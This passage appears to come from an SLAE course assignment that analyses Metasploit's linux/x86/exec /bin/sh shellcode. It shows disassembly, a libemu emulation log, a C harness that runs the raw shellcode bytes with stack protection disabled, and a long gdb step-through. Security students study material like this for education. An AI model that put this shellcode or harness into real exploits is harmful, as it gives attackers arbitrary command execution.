00000009  89E7              mov edi,esp ; ptr to '-c' + null ('\0')
0000000B  682F736800        push dword 0x ; push '/sh' on the stack
00000010  682F62696E        push dword 0x6e69622f ; push '/bin' on the stack
00000015  89E3              mov ebx,esp ; ptr to '/bin/sh'
00000017  52                push edx ; pushes ptr to '-c' + null ('\0')
00000018  E808000000        call dword 0x25 ; build arguments structure
0000001D  2F                das
0000001E  62696E            bound ebp,[ecx+0x6e]
00000021  2F                das
00000022  7368              jnc 0x8c
00000024  005753            add [edi+0x53],dl
00000027  89E1              mov ecx,esp ; ptr to arguments structure
00000029  CD80              int 0x80 ; calls (sys_execve)
```

Libemu:

```
root@kali:~# msfvenom -p linux/x86/exec --arch x86 --platform linux CMD=/bin/sh R | /opt/libemu/bin/sctest -vvv -Ss 1000000
verbose = 3
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes

[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417000
[emu 0x0x5592cf7cd4f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417000
[emu 0x0x5592cf7cd4f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 6A0B                            push byte 0xb
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417002
[emu 0x0x5592cf7cd4f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 58                              pop eax
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417003
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 99                              cwd 
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417004
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 52                              push edx
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417005
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 66682D63                        push word 0x632d
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417009
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fc8  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 89E7                            mov edi,esp
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x0041700b
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fc8  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 682F736800                      push dword 0x68732f
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417010
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fc4  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 682F62696E                      push dword 0x6e69622f
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417015
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fc0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 89E3                            mov ebx,esp
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417017
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fc0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 52                              push edx
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417018
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fbc  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] E8                              call 0x1
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417025
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb8  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 57                              push edi
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417026
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb4  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 53                              push ebx
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417027
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00000000  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 89E1                            mov ecx,esp
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x00417029
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00416fb0  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] CD80                            int 0x80
execve ; calls execve with expected argument
int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x0041702b
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00416fb0  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
[emu 0x0x5592cf7cd4f0 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 15
[emu 0x0x5592cf7cd4f0 debug ] cpu state    eip=0x0041702d
[emu 0x0x5592cf7cd4f0 debug ] eax=0x0000000b  ecx=0x00416fb0  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x5592cf7cd4f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x5592cf7cd4f0 debug ] Flags: 
int execve (
     const char * dateiname = 0x00416fc0 => 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 => 
               = 0x00416fc0 => 
                   = "/bin/sh";
           = 0x00416fb4 => 
               = 0x00416fc8 => 
                   = "-c";
           = 0x00416fb8 => 
               = 0x0041701d => 
                   = "/bin/sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
root@kali:~# 
```

Libemu confirms that the shellcode behaves as expected calling execve with the /bin/sh argument.
Let's create a skeleton program:

```
// Filename: shellcode3.c
// Author:  SLAE-935
//
// Shellcode: msfvenom -p linux/x86/exec --arch x86 --platform linux -f c CMD=/bin/sh

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80";
void main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode3.c -o shellcode3
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode3.c -o shellcode3
```

Full GDB dump with comments:

```
vagrant@precise32:/slae_code/Assignment 5$ gdb -q shellcode3
Reading symbols from /slae_code/Assignment 5/shellcode3...(no debugging symbols found)...done.
gdb-peda$ info variables 
All defined variables:

Non-debugging symbols:
0x08048508  _fp_hw
0x0804850c  _IO_stdin_used
0x08048620  __FRAME_END__
0x08049f14  __CTOR_LIST__
0x08049f14  __init_array_end
0x08049f14  __init_array_start
0x08049f18  __CTOR_END__
0x08049f1c  __DTOR_LIST__
0x08049f20  __DTOR_END__
0x08049f24  __JCR_END__
0x08049f24  __JCR_LIST__
0x08049f28  _DYNAMIC
0x08049ff4  _GLOBAL_OFFSET_TABLE_
0x0804a020  __data_start
0x0804a020  data_start
0x0804a024  __dso_handle
0x0804a040  code ; this is the variable where to set breakpoint
0x0804a06c  completed.6159
0x0804a070  dtor_idx.6161
gdb-peda$ b *0x0804a040 ; set breakpoint at the 'code' variable
Breakpoint 1 at 0x804a040
gdb-peda$ r ; run the program that should stop at breakpoint1 at address 0x804a040
Shellcode Length:  15

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x99580b6a 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a040 --> 0x99580b6a
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03a <__dso_handle+22>:	add    BYTE PTR [eax],al
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
=> 0x804a040 <code>:	push   0xb ; push 0xb (sys_execve) on the stack
   0x804a042 <code+2>:	pop    eax
   0x804a043 <code+3>:	cdq    
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	pushw  0x632d
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0xf 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x804a040 --> 0x99580b6a 
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0xb ('\x0b')
EIP: 0x804a042 --> 0x66529958
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03c <__dso_handle+24>:	add    BYTE PTR [eax],al
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	push   0xb
=> 0x804a042 <code+2>:	pop    eax ; store 0xb (sys_execve) in EAX
   0x804a043 <code+3>:	cdq    
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	pushw  0x632d
   0x804a049 <code+9>:	mov    edi,esp
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0xb ('\x0b')
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0xf 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a042 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a043 --> 0x68665299
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a03e <__dso_handle+26>:	add    BYTE PTR [eax],al
   0x804a040 <code>:	push   0xb
   0x804a042 <code+2>:	pop    eax
=> 0x804a043 <code+3>:	cdq ; double AL to EAX   
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	pushw  0x632d
   0x804a049 <code+9>:	mov    edi,esp
   0x804a04b <code+11>:	push   0x68732f
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0xf 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a043 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
EIP: 0x804a044 ("Rfh-c\211?h/sh")
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a040 <code>:	push   0xb
   0x804a042 <code+2>:	pop    eax
   0x804a043 <code+3>:	cdq    
=> 0x804a044 <code+4>:	push   edx ; push null on the stack
   0x804a045 <code+5>:	pushw  0x632d
   0x804a049 <code+9>:	mov    edi,esp
   0x804a04b <code+11>:	push   0x68732f
   0x804a050 <code+16>:	push   0x6e69622f
[------------------------------------stack-------------------------------------]
0000| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0004| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0008| 0xbffff6d4 --> 0xf 
0012| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0016| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0020| 0xbffff6e0 --> 0xffffffff 
0024| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
0028| 0xbffff6e8 --> 0xb7fd1ff4 --> 0x1a0d7c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a044 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c8 --> 0x0 
EIP: 0x804a045 ("fh-c\211?h/sh")
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a042 <code+2>:	pop    eax
   0x804a043 <code+3>:	cdq    
   0x804a044 <code+4>:	push   edx
=> 0x804a045 <code+5>:	pushw  0x632d ; push '-c' on the stack
   0x804a049 <code+9>:	mov    edi,esp
   0x804a04b <code+11>:	push   0x68732f
   0x804a050 <code+16>:	push   0x6e69622f
   0x804a055 <code+21>:	mov    ebx,esp
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c8 --> 0x0 
0004| 0xbffff6cc --> 0x8048430 (<main+76>:	mov    edi,DWORD PTR [ebp-0x4])
0008| 0xbffff6d0 --> 0x8048510 ("Shellcode Length:  %d\n")
0012| 0xbffff6d4 --> 0xf 
0016| 0xbffff6d8 --> 0x8049ff4 --> 0x8049f28 --> 0x1 
0020| 0xbffff6dc --> 0x8048461 (<__libc_csu_init+33>:	lea    eax,[ebx-0xe0])
0024| 0xbffff6e0 --> 0xffffffff 
0028| 0xbffff6e4 --> 0xb7e641a6 (add    ebx,0x16de4e)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a045 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x804a050 ("h/bin\211?R?\b")
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c6 --> 0x632d ('-c')
EIP: 0x804a049 --> 0x2f68e789
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a043 <code+3>:	cdq    
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	pushw  0x632d
=> 0x804a049 <code+9>:	mov    edi,esp ; ptr to '-c' + null ('\0')
   0x804a04b <code+11>:	push   0x68732f
   0x804a050 <code+16>:	push   0x6e69622f
   0x804a055 <code+21>:	mov    ebx,esp
   0x804a057 <code+23>:	push   edx
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c6 --> 0x632d ('-c')
0004| 0xbffff6ca --> 0x84300000 
0008| 0xbffff6ce --> 0x85100804 
0012| 0xbffff6d2 --> 0xf0804 
0016| 0xbffff6d6 --> 0x9ff40000 
0020| 0xbffff6da --> 0x84610804 
0024| 0xbffff6de --> 0xffff0804 
0028| 0xbffff6e2 --> 0x41a6ffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a049 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c6 --> 0x632d ('-c')
EIP: 0x804a04b ("h/sh")
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a044 <code+4>:	push   edx
   0x804a045 <code+5>:	pushw  0x632d
   0x804a049 <code+9>:	mov    edi,esp
=> 0x804a04b <code+11>:	push   0x68732f ; push '/sh' on the stack
   0x804a050 <code+16>:	push   0x6e69622f
   0x804a055 <code+21>:	mov    ebx,esp
   0x804a057 <code+23>:	push   edx
   0x804a058 <code+24>:	call   0x804a065 <code+37>
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c6 --> 0x632d ('-c')
0004| 0xbffff6ca --> 0x84300000 
0008| 0xbffff6ce --> 0x85100804 
0012| 0xbffff6d2 --> 0xf0804 
0016| 0xbffff6d6 --> 0x9ff40000 
0020| 0xbffff6da --> 0x84610804 
0024| 0xbffff6de --> 0xffff0804 
0028| 0xbffff6e2 --> 0x41a6ffff 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a04b in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6c2 --> 0x68732f ('/sh')
EIP: 0x804a050 ("h/bin\211?R?\b")
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a045 <code+5>:	pushw  0x632d
   0x804a049 <code+9>:	mov    edi,esp
   0x804a04b <code+11>:	push   0x68732f
=> 0x804a050 <code+16>:	push   0x6e69622f ; push '/bin' on the stack
   0x804a055 <code+21>:	mov    ebx,esp
   0x804a057 <code+23>:	push   edx
   0x804a058 <code+24>:	call   0x804a065 <code+37>
   0x804a05d <code+29>:	das
[------------------------------------stack-------------------------------------]
0000| 0xbffff6c2 --> 0x68732f ('/sh')
0004| 0xbffff6c6 --> 0x632d ('-c')
0008| 0xbffff6ca --> 0x84300000 
0012| 0xbffff6ce --> 0x85100804 
0016| 0xbffff6d2 --> 0xf0804 
0020| 0xbffff6d6 --> 0x9ff40000 
0024| 0xbffff6da --> 0x84610804 
0028| 0xbffff6de --> 0xffff0804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a050 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xb7fd1ff4 --> 0x1a0d7c 
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6be ("/bin/sh")
EIP: 0x804a055 --> 0xe852e389
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a049 <code+9>:	mov    edi,esp
   0x804a04b <code+11>:	push   0x68732f
   0x804a050 <code+16>:	push   0x6e69622f
=> 0x804a055 <code+21>:	mov    ebx,esp ; ptr to '/bin/sh'
   0x804a057 <code+23>:	push   edx
   0x804a058 <code+24>:	call   0x804a065 <code+37>
   0x804a05d <code+29>:	das    
   0x804a05e <code+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
[------------------------------------stack-------------------------------------]
0000| 0xbffff6be ("/bin/sh")
0004| 0xbffff6c2 --> 0x68732f ('/sh')
0008| 0xbffff6c6 --> 0x632d ('-c')
0012| 0xbffff6ca --> 0x84300000 
0016| 0xbffff6ce --> 0x85100804 
0020| 0xbffff6d2 --> 0xf0804 
0024| 0xbffff6d6 --> 0x9ff40000 
0028| 0xbffff6da --> 0x84610804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a055 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6be ("/bin/sh")
EIP: 0x804a057 --> 0x8e852
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a04b <code+11>:	push   0x68732f
   0x804a050 <code+16>:	push   0x6e69622f
   0x804a055 <code+21>:	mov    ebx,esp
=> 0x804a057 <code+23>:	push   edx ; pushes ptr to '-c' + null ('\0')
   0x804a058 <code+24>:	call   0x804a065 <code+37>
   0x804a05d <code+29>:	das    
   0x804a05e <code+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x804a061 <code+33>:	das
[------------------------------------stack-------------------------------------]
0000| 0xbffff6be ("/bin/sh")
0004| 0xbffff6c2 --> 0x68732f ('/sh')
0008| 0xbffff6c6 --> 0x632d ('-c')
0012| 0xbffff6ca --> 0x84300000 
0016| 0xbffff6ce --> 0x85100804 
0020| 0xbffff6d2 --> 0xf0804 
0024| 0xbffff6d6 --> 0x9ff40000 
0028| 0xbffff6da --> 0x84610804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a057 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6ba --> 0x0 
EIP: 0x804a058 --> 0x8e8
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a050 <code+16>:	push   0x6e69622f
   0x804a055 <code+21>:	mov    ebx,esp
   0x804a057 <code+23>:	push   edx
=> 0x804a058 <code+24>:	call   0x804a065 <code+37> ; build arguments structure
   0x804a05d <code+29>:	das    
   0x804a05e <code+30>:	bound  ebp,QWORD PTR [ecx+0x6e]
   0x804a061 <code+33>:	das    
   0x804a062 <code+34>:	jae    0x804a0cc
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x6e69622f ('/bin')
arg[2]: 0x68732f ('/sh')
arg[3]: 0x632d ('-c')
arg[4]: 0x84300000 
arg[5]: 0x85100804 
[------------------------------------stack-------------------------------------]
0000| 0xbffff6ba --> 0x0 
0004| 0xbffff6be ("/bin/sh")
0008| 0xbffff6c2 --> 0x68732f ('/sh')
0012| 0xbffff6c6 --> 0x632d ('-c')
0016| 0xbffff6ca --> 0x84300000 
0020| 0xbffff6ce --> 0x85100804 
0024| 0xbffff6d2 --> 0xf0804 
0028| 0xbffff6d6 --> 0x9ff40000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a058 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
EBP: 0xbffff708 --> 0x0 
ESP: 0xbffff6b6 --> 0x804a05d ("/bin/sh")
EIP: 0x804a065 --> 0xe1895357
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x804a065 <code+37>:	push   edi ; ptr to '-c'
   0x804a066 <code+38>:	push   ebx
   0x804a067 <code+39>:	mov    ecx,esp
   0x804a069 <code+41>:	int    0x80
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b6 --> 0x804a05d ("/bin/sh")
0004| 0xbffff6ba --> 0x0 
0008| 0xbffff6be ("/bin/sh")
0012| 0xbffff6c2 --> 0x68732f ('/sh')
0016| 0xbffff6c6 --> 0x632d ('-c')
0020| 0xbffff6ca --> 0x84300000 
0024| 0xbffff6ce --> 0x85100804 
0028| 0xbffff6d2 --> 0xf0804 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804a065 in code ()
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff6be ("/bin/sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0xbffff6c6 --> 0x632d ('-c')
